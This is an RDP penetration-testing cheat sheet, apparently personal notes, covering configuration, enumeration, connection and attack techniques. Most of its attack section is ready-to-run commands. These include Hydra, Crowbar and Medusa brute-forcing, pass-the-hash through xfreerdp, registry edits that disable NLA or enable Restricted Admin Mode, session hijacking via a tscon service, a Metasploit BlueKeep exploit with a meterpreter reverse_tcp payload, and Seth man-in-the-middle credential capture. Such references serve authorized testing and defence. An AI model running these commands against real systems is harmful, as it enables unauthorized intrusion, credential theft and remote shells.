#RDP #RemoteDesktopProtocol #remoteaccess

## What is RDP?
Remote Desktop Protocol — Microsoft's proprietary protocol for GUI-based remote access. Supports clipboard sharing, drive redirection, audio, and printer forwarding. Originally Windows-only; Linux implementations include xrdp and FreeRDP.

- Port **TCP/UDP 3389** — RDP (default)
- Authentication: Network Level Authentication (NLA), TLS, CredSSP
- Can use TLS but typically self-signed certs (MITM possible without cert pinning)
- Managed via Windows Server Manager, Group Policy, or registry

---

## Configuration

```cmd
# Enable RDP (Windows)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow

# Disable NLA (requires less-secure auth)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Enable PTH for RDP (Restricted Admin Mode)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

## Enumeration

```bash
# Nmap
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-fingerprint-mitm -sV <target>

# rdp-sec-check (identify security config without auth)
git clone https://github.com/CiscoCXSecurity/rdp-sec-check
perl rdp-sec-check.pl <target>

# Check for BlueKeep / DejaBlue
nmap -p 3389 --script rdp-vuln-ms12-020 <target>
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep  # BlueKeep
```

---

## Connect / Access

### Linux — xfreerdp / FreeRDP

```bash
# Standard connection
xfreerdp /u:<user> /p:<password> /v:<target>

# With domain
xfreerdp /d:<domain> /u:<user> /p:<password> /v:<target>

# Enable drive sharing (share local folder)
xfreerdp /u:<user> /p:<password> /v:<target> /drive:<share_name>,<local_path>

# Dynamic resolution
xfreerdp /u:<user> /p:<password> /v:<target> /dynamic-resolution

# Legacy encryption / ignore cert
xfreerdp /u:<user> /p:<password> /v:<target> /cert-ignore

# Full screen
xfreerdp /u:<user> /p:<password> /v:<target> /f

# Pass-the-Hash (Restricted Admin Mode must be enabled on target)
xfreerdp /u:<user> /pth:<NTLM_hash> /v:<target>

# Compression (faster)
xfreerdp /u:<user> /p:<password> /v:<target> +compression
```

### Windows

```cmd
# RDC (mstsc)
mstsc.exe /v:<target>
mstsc.exe /v:<target>:3389

# Command line with saved credentials
cmdkey /generic:<target> /user:<user> /pass:<password>
mstsc.exe /v:<target>
```

---

## Attack Vectors

### Brute Force

```bash
# Hydra
hydra -L users.txt -P passwords.txt rdp://<target>
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target> -t 1

# Crowbar (RDP-specific, slower but handles NLA)
crowbar -b rdp -s <target>/32 -u <user> -C passwords.txt -n 1

# Medusa
medusa -h <target> -u administrator -P passwords.txt -M rdp
```

### Pass-the-Hash (Restricted Admin Mode)

```bash
# Enable Restricted Admin Mode on target (requires existing admin)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Connect with hash
xfreerdp /u:<user> /pth:<NTLM_hash> /v:<target>
```

### RDP Session Hijacking (Local Admin Required)

```cmd
# List active RDP sessions
query user /server:<target>

# Hijack disconnected session without password (as SYSTEM)
sc create rdphijack binPath= "cmd.exe /k tscon <session_id> /dest:<current_session_name>"
sc start rdphijack

# Or directly (as SYSTEM via PsExec/SeDebugPrivilege)
tscon <session_id> /dest:rdp-tcp#<current_session_id>
```

### BlueKeep (CVE-2019-0708) — Pre-Auth RCE

```bash
# Targets: Windows XP/7/2003/2008 (unpatched)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

### MITM on Self-Signed Certs

```bash
# Seth — RDP MitM attack
git clone https://github.com/SySS-Research/Seth
python3 seth.py eth0 <attacker_ip> <client_ip> <target_ip>
# Captures credentials in plaintext when victim connects through attacker
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| NLA disabled | Pre-auth exploits easier, credential relay possible |
| Self-signed cert | MITM attacks |
| Weak/default credentials | Brute force access |
| RDP exposed to internet | Large attack surface |
| Restricted Admin Mode enabled with weak creds | PTH |
| Old unpatched Windows | BlueKeep / DejaBlue |
| Disconnected sessions | Session hijacking |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (Linux) | `xfreerdp /u:user /p:pass /v:host` |
| Connect (with domain) | `xfreerdp /d:domain /u:user /p:pass /v:host` |
| Connect (PTH) | `xfreerdp /u:user /pth:NTLM /v:host` |
| Ignore cert | `xfreerdp /u:user /p:pass /v:host /cert-ignore` |
| Brute force | `hydra -l admin -P rockyou.txt rdp://host -t 1` |
| Sec check | `perl rdp-sec-check.pl host` |
| Session list | `query user /server:host` |
| Enable restricted admin | `reg add HKLM\...\Lsa /v DisableRestrictedAdmin /d 0x0 /f` |
| BlueKeep | MSF `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
